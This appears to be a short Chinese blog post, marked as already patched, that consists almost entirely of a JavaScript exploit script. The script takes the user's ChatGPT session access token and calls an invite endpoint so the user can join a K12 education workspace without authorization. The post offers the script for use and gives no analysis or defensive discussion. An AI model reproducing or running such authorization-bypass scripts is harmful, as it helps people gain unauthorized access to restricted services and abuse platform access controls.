---
title: ChatGpt K12 Bug - 已拉闸
description: ChatGPT K12 工作空间的越权邀请漏洞利用脚本。
date: 2026-07-02
category: engineering
tags:
  - chatgpt
  - security
  - bug
featured: false
draft: false
readingTime: 12 min read
---

## 越权加入 K12 工作空间脚本

```javascript
fetch("https://chatgpt.com/api/auth/session", {
  method: "GET",
  credentials: "include"
})
.then(response => response.json())
.then(sessionData => {
  const accessToken = sessionData.accessToken;
  
  if (!accessToken) {
    throw new Error('未能获取到 accessToken');
  }
  
  console.log('获取到 accessToken，正在发送邀请请求...');
  
  return fetch("https://chatgpt.com/backend-api/accounts/<ACCOUNT_ID>/invites/request", {
    "headers": {
      "accept": "*/*",
      "accept-language": "en-US,en;q=0.9",
      "authorization": `Bearer ${accessToken}`,
      "cache-control": "no-cache",
      "oai-language": "en-US",
      "pragma": "no-cache",
      "sec-ch-ua-arch": "\"x86\"",
      "sec-ch-ua-bitness": "\"64\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-model": "\"\"",
      "sec-ch-ua-platform": "\"macOS\"",
      "sec-ch-ua-platform-version": "\"13.5.1\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin"
    },
    "referrer": "https://chatgpt.com/k12-verification",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": null,
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
  });
})
.then(response => response.json())
.then(result => {
  console.log('邀请请求成功:', result);
})
.catch(error => {
  console.error('请求失败:', error);
});
```
